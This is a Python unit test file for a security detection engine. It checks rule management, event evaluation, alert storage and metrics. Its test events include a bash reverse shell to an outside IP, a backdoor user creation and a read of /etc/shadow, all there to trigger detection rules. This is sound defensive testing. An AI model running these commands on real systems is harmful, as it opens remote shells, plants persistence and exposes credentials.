"""Unit tests for DetectionEngine registry, lifecycle, and batch evaluation."""

from src.detection.engine import DetectionEngine
from src.detection.models import DetectionRule
from src.detection.rules import get_default_rules
from src.detection.storage import AlertStore
from src.siem.models import (
    ECSEvent,
    EndpointInfo,
    EventCategory,
    EventMetadata,
    EventOutcome,
    EventSeverity,
    HostInfo,
    ProcessInfo,
    UserInfo,
)
from src.siem.storage import EventStore


def test_detection_engine_initialization_and_rules():
    engine = DetectionEngine()
    rules = engine.list_rules()
    assert len(rules) >= 20

    # Rule retrieval
    r1 = engine.get_rule("DET-AUTH-001")
    assert r1 is not None
    assert r1.id == "DET-AUTH-001"

    # Disable rule
    engine.enable_rule("DET-AUTH-001", False)
    assert engine.get_rule("DET-AUTH-001").enabled is False

    # Re-enable
    engine.enable_rule("DET-AUTH-001", True)
    assert engine.get_rule("DET-AUTH-001").enabled is True


def test_detection_engine_evaluate_event_and_alert_store():
    store = AlertStore()
    engine = DetectionEngine(alert_store=store)

    event = ECSEvent(
        event=EventMetadata(category=EventCategory.PROCESS),
        host=HostInfo(name="srv01.corp.enterprise.local"),
        user=UserInfo(name="attacker"),
        process=ProcessInfo(
            name="bash",
            command_line="bash -i >& /dev/tcp/198.51.100.20/4444 0>&1",
        ),
    )

    alerts = engine.evaluate_event(event)
    assert len(alerts) == 1
    assert alerts[0].rule_id == "DET-PROC-001"
    assert store.count() == 1


def test_detection_engine_evaluate_store():
    event_store = EventStore()
    alert_store = AlertStore()
    engine = DetectionEngine(alert_store=alert_store)

    # Add benign and malicious events to store
    event_store.add_event(
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            process=ProcessInfo(name="ls", command_line="ls -la /home"),
        )
    )
    event_store.add_event(
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            process=ProcessInfo(
                name="useradd",
                command_line="useradd -m -s /bin/bash backdoor_user",
            ),
        )
    )
    event_store.add_event(
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            process=ProcessInfo(
                name="cat",
                command_line="cat /etc/shadow",
            ),
        )
    )

    alerts = engine.evaluate_store(event_store)
    assert len(alerts) >= 2
    rule_ids = [a.rule_id for a in alerts]
    assert "DET-PERSIST-003" in rule_ids
    assert "DET-CRED-002" in rule_ids


def test_detection_engine_metrics():
    engine = DetectionEngine()
    metrics = engine.get_metrics()

    assert metrics["total_rules"] >= 20
    assert metrics["enabled_rules"] == metrics["total_rules"]
    assert "Execution" in metrics["by_tactic"]
    assert "Credential Access" in metrics["by_tactic"]
    assert "Persistence" in metrics["by_tactic"]
